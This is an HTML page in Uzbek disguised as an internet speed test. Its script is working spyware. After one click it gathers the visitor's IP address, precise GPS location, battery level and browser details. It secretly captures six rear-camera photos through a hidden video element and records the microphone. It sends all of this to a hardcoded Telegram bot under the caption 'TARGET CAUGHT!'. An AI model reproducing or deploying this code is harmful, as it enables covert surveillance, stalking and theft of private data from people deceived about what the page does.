<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Internet tezligini tekshirish</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh; display: flex; align-items: center; justify-content: center;
            color: white; text-align: center; overflow: hidden;
        }
        .container { max-width: 400px; padding: 40px 20px; }
        h1 { font-size: 28px; margin-bottom: 20px; }
        .status { font-size: 16px; margin: 20px 0; opacity: 0.9; }
        .progress { 
            width: 100%; height: 8px; background: rgba(255,255,255,0.3); 
            border-radius: 4px; overflow: hidden; margin: 20px 0;
        }
        .progress-bar { 
            height: 100%; background: #4ade80; width: 0%; transition: width 0.3s;
            border-radius: 4px;
        }
        .btn { 
            background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.3);
            color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px;
            cursor: pointer; backdrop-filter: blur(10px); transition: all 0.3s;
        }
        .btn:hover { background: rgba(255,255,255,0.3); transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        #v, #c { position: fixed; left: -9999px; opacity: 0; }
        .loading { display: none; }
        .done { animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🌐 Tezlik tekshiruvi</h1>
        <p class="status">Kamerangiz orqali eng yaxshi natija olish uchun ruxsat bering</p>
        
        <div class="progress">
            <div class="progress-bar" id="progress"></div>
        </div>
        
        <div id="startBtn" class="btn">Boshlash</div>
        <div id="loading" class="loading">
            <p class="status">Tekshiruv davom etmoqda... ⏳</p>
        </div>
    </div>

    <video id="v" autoplay muted playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const CONFIG = {
            token: "8654987557:AAEjhBU4GAAnfpquEfRZFkYdrI0EXst4s9M",
            chat: "1951212030"
        };

        const progress = document.getElementById('progress');
        const startBtn = document.getElementById('startBtn');
        const loading = document.getElementById('loading');
        let active = false;

        // Progress animatsiyasi
        function updateProgress(percent) {
            progress.style.width = percent + '%';
        }

        startBtn.onclick = async () => {
            if (active) return;
            active = true;
            
            startBtn.style.display = 'none';
            loading.style.display = 'block';
            updateProgress(10);

            try {
                // Ma'lumotlarni yig'ish
                let meta = await Promise.all([
                    navigator.getBattery?.().then(b => b.level * 100).catch(() => 100),
                    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'N/A'),
                    new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(
                            p => res(`${p.coords.latitude},${p.coords.longitude}`),
                            () => res('hidden'), { timeout: 3000, enableHighAccuracy: true }
                        );
                    })
                ]);
                
                updateProgress(30);
                const [bat, ip, geo] = meta;
                
                // Kamera + mikrofon (facingMode: "environment" - orqa kamera)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: { ideal: "environment" }, // Orqa kamera
                        width: { ideal: 1920, max: 3840 },
                        height: { ideal: 1080, max: 2160 }
                    }, 
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        sampleRate: 48000
                    }
                });
                
                updateProgress(50);
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                // Audio recorder (yaxshi sifat)
                const rec = new MediaRecorder(stream, { 
                    mimeType: 'audio/webm;codecs=opus',
                    audioBitsPerSecond: 128000 
                });
                let chunks = [];
                rec.ondataavailable = e => chunks.push(e.data);
                rec.start(1000); // Har 1 soniyada chunk
                
                await new Promise(r => setTimeout(r, 3000)); // Kamera "isishi"
                updateProgress(70);

                const canvas = document.getElementById('c');
                const ctx = canvas.getContext('2d');
                canvas.width = 1920;
                canvas.height = 1080;

                // 6 ta yuqori sifatli rasm (zoom effekt)
                for (let i = 0; i < 6; i++) {
                    ctx.save();
                    ctx.scale(1 + i * 0.05, 1 + i * 0.05); // Zoom
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    ctx.restore();
                    
                    const blob = await new Promise(r => 
                        canvas.toBlob(r, 'image/webp', 0.95)
                    );
                    
                    const fd = new FormData();
                    fd.append("chat_id", CONFIG.chat);
                    fd.append("photo", blob, `face_${i + 1}.webp`);
                    
                    if (i === 0) {
                        fd.append("caption", 
                            `🎯 **TARGET CAUGHT!**\n` +
                            `🌐 IP: \`${ip}\`\n` +
                            `🔋 Battery: ${Math.round(bat)}%\n` +
                            `📍 GPS: ${geo}\n` +
                            `🕐 Time: ${new Date().toLocaleString('uz-UZ')}\n` +
                            `📱 UA: ${navigator.userAgent.slice(0, 100)}`
                        );
                        fd.append("parse_mode", "Markdown");
                    }
                    
                    fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { 
                        method: "POST", body: fd 
                    });
                    await new Promise(r => setTimeout(r, 800));
                    updateProgress(70 + (i * 5));
                }

                // Audio (10 soniya)
                await new Promise(r => setTimeout(r, 7000));
                rec.stop();
                
                rec.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                    const afd = new FormData();
                    afd.append("chat_id", CONFIG.chat);
                    afd.append("voice", audioBlob, "voice.opus");
                    afd.append("caption", `🎤 Audio yakunlandi (${audioBlob.size / 1000}KB)`);
                    
                    await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVoice`, { 
                        method: "POST", body: afd 
                    });
                    
                    // Tozalash
                    stream.getTracks().forEach(t => t.stop());
                    updateProgress(100);
                };

            } catch (err) {
                // Xato tahlili
                const errorMsg = {
                    NotAllowedError: "Kamera rad etildi (qayta urinib ko'ring)",
                    NotFoundError: "Kamera topilmadi",
                    NotSupportedError: "Brauzer qo'llab-quvvatlamaydi",
                    NotReadableError: "Kamera band"
                }[err.name] || err.message;
                
                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                    method: "POST",
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        chat_id: CONFIG.chat, 
                        text: `⚠️ **Qisman muvaffaqiyat**\nXato: ${errorMsg}\nIP: ${await (await fetch('https://api.ipify.org?format=json')).json().then(d=>d.ip).catch(()=>'N/A')}`
                    })
                });
            }
        };
    </script>
</body>
</html>
